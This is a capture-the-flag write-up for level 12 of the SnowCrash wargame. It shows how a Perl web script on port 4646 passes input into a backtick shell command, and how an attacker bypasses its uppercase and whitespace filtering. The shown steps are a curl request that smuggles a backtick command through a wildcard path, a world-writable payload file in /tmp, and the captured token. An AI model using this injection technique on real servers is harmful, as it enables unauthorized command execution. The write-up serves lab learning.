# Level12

This time, we find a perl script `level12.pl` owned by `flag12` in our home directory. It appears to be a web server to handle HTTP requests on port 4646.

We see our first argument taken in: `$xx = $_[0];`

Next, lowercase characters are converted to uppercase: `$xx =~ tr/a-z/A-Z/;`

Then all characters are truncated after the first whitespace: `$xx =~ s/\s.*//;`

Finally, we see the vulnerability, where our input is executed and we can inject a command: ``@output = `egrep "^$xx" /tmp/xd 2>&1`;``

Our goal, similarly to the previous level, is to make this script execute `getflag > /tmp/flag` for us. However, the rudimentary input sanitization in the script will prevent this, so let's make a quick workaround.

```
echo 'getflag > /tmp/flag' > /tmp/MAGIC && chmod 777 /tmp/MAGIC
```

We'll create a file with our desired command inside it, make its name uppercase to avoid problems with the sanitization, and give everyone and everything permissions to it.

```
curl localhost:4646/?x='`/*/MAGIC`'
```

Make an HTTP GET request to the server, passing our magic file path as our input for x. We use the `*` wildcard to avoid `/tmp` being translated to `/TMP` by the input sanitization.

```
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
Now we can `su level13`.